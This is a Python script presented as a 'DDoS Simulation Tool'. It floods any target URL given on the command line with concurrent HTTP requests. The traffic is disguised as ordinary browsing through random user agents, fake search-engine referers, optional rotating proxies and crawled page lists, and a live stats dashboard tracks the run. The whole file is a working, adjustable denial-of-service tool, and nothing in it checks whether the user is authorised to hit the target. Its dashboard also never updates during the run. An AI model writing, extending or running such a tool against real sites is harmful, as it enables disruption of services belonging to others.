import requests
import threading
import time
import random
import logging
import sys
import argparse
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import urllib.parse
from queue import Queue
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.layout import Layout

# Initialize tools
init()  # Colorama
console = Console()  # Rich console
logging.basicConfig(
    filename='ddos_simulation.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s'
)

# Default configuration
DEFAULT_THREADS = 10
DEFAULT_DELAY = 0.5
DEFAULT_TIMEOUT = 5
DEFAULT_MAX_REQUESTS = 50
PROXY_LIST = []  # Add proxies here if desired, e.g., [{'http': 'http://proxy_ip:port'}]

# Global state
request_counter = 0
success_counter = 0
error_counter = 0
active_threads = 0
lock = threading.Lock()
ua = UserAgent()
page_queue = Queue()
stats = {'rate': 0, 'last_update': time.time()}

def get_random_headers(referer=None):
    """Generate realistic browser headers."""
    return {
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9']),
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': referer or random.choice(['https://google.com', 'https://bing.com', None]),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }

def discover_pages(base_url, session):
    """Dynamically discover pages."""
    try:
        response = session.get(base_url, headers=get_random_headers(), timeout=DEFAULT_TIMEOUT)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [urllib.parse.urljoin(base_url, a.get('href')) 
                 for a in soup.find_all('a', href=True) 
                 if urllib.parse.urljoin(base_url, a.get('href')).startswith(base_url)]
        return list(set(links)) if links else [base_url]
    except Exception as e:
        logging.error(f"Page discovery failed: {str(e)}")
        return [base_url]

def get_proxy():
    """Get a random proxy (if configured)."""
    return random.choice(PROXY_LIST) if PROXY_LIST else None

def simulate_user(thread_id, base_url, pages, args):
    """Simulate realistic user behavior."""
    global request_counter, success_counter, error_counter, active_threads
    sent_requests = 0
    session = requests.Session()
    with lock:
        active_threads += 1
    
    proxy = get_proxy()
    if proxy:
        session.proxies = proxy
        logging.info(f"Thread {thread_id} using proxy: {proxy}")

    while sent_requests < args.max_requests:
        target_url = random.choice(pages) if random.random() > 0.3 else page_queue.get() if not page_queue.empty() else base_url
        headers = get_random_headers(referer=target_url if sent_requests > 0 else None)
        
        try:
            response = session.get(target_url, headers=headers, timeout=args.timeout, allow_redirects=True)
            with lock:
                request_counter += 1
                success_counter += 1
                now = time.time()
                stats['rate'] = (request_counter / (now - stats['last_update'])) * 60
                stats['last_update'] = now
            
            log_msg = f"Thread {thread_id} | Visited {target_url} | Status: {response.status_code}"
            console.print(f"{Fore.GREEN}[SUCCESS]{Style.RESET_ALL} {log_msg}")
            logging.info(log_msg)

            # Dynamic page discovery
            if random.random() < 0.1:
                new_pages = discover_pages(target_url, session)
                for page in new_pages:
                    page_queue.put(page)

            # Simulate time on page
            time.sleep(random.uniform(1, 4))

        except requests.exceptions.RequestException as e:
            with lock:
                request_counter += 1
                error_counter += 1
            log_msg = f"Thread {thread_id} | Failed {target_url}: {str(e)}"
            console.print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {log_msg}")
            logging.error(log_msg)

        sent_requests += 1
        time.sleep(args.delay * random.uniform(0.5, 1.5))
    
    with lock:
        active_threads -= 1

def create_dashboard(args):
    """Create a real-time dashboard layout."""
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="stats", size=10),
        Layout(name="logs")
    )
    return layout

def update_dashboard(layout, live, args):
    """Update the real-time dashboard."""
    with lock:
        layout["header"].update(
            Table.grid(expand=True).add_row(
                f"[yellow]DDoS Simulation - Target: {args.target}[/yellow]",
                f"[yellow]Threads: {active_threads}/{args.threads}[/yellow]",
                f"[yellow]Press Ctrl+C to stop[/yellow]"
            )
        )
        
        stats_table = Table(title="Real-Time Stats", expand=True)
        stats_table.add_column("Metric", justify="left")
        stats_table.add_column("Value", justify="right")
        stats_table.add_row("Total Requests", str(request_counter))
        stats_table.add_row("Successes", str(success_counter))
        stats_table.add_row("Errors", str(error_counter))
        stats_table.add_row("Req/Min", f"{stats['rate']:.2f}")
        stats_table.add_row("Queue Size", str(page_queue.qsize()))
        layout["stats"].update(stats_table)
        
        layout["logs"].update("See terminal output for logs")

def start_simulation(args):
    """Start the simulation with CLI arguments."""
    console.print(f"[yellow]Starting DDoS simulation on {args.target}...[/yellow]")
    logging.info(f"Simulation started on {args.target} with {args.threads} threads")

    # Initial page discovery
    session = requests.Session()
    pages = discover_pages(args.target, session)
    for page in pages:
        page_queue.put(page)
    console.print(f"[yellow]Initial pages: {pages}[/yellow]")

    # Real-time dashboard
    layout = create_dashboard(args)
    with Live(layout, refresh_per_second=4, console=console) as live:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            executor.map(lambda tid: simulate_user(tid, args.target, pages, args), range(args.threads))
        
        while active_threads > 0:
            update_dashboard(layout, live, args)
            time.sleep(0.25)

    logging.info("Simulation completed")

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DDoS Simulation Tool")
    parser.add_argument('--target', required=True, help="Target URL (e.g., https://example.com)")
    parser.add_argument('--threads', type=int, default=DEFAULT_THREADS, help="Number of threads")
    parser.add_argument('--delay', type=float, default=DEFAULT_DELAY, help="Base delay (seconds)")
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, help="Request timeout (seconds)")
    parser.add_argument('--max-requests', type=int, default=DEFAULT_MAX_REQUESTS, help="Max requests per thread")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    try:
        start_simulation(args)
    except KeyboardInterrupt:
        console.print(f"\n[yellow]Simulation stopped by user[/yellow]")
        logging.info("Simulation stopped by user")
        console.print(f"Final Stats - Requests: {request_counter}, Success: {success_counter}, Errors: {error_counter}")
        console.print("Check 'ddos_simulation.log' for details.")
